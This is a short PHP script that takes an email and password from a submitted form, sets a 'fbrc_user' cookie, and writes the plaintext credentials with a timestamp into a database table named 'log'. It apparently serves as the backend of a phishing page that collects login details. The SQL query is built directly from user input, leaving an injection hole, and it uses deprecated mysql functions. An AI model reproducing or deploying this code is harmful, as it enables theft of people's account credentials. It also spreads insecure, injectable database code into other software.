<?php

include 'db.php';
$email = $_POST['email'];
$pass = $_POST['pass'];
$date = date("d F Y h:i:s A");
setcookie("fbrc_user", $email, time() + (86400 * 30), "/"); 

$sql = "INSERT INTO log
	(username,pass,date)
	VALUES
	('$email','$pass','$date')";
mysql_select_db($dbname);
$retval = mysql_query( $sql, $conn );
if(! $retval )
{
  die('Could not get data: ' . mysql_error());
}



?>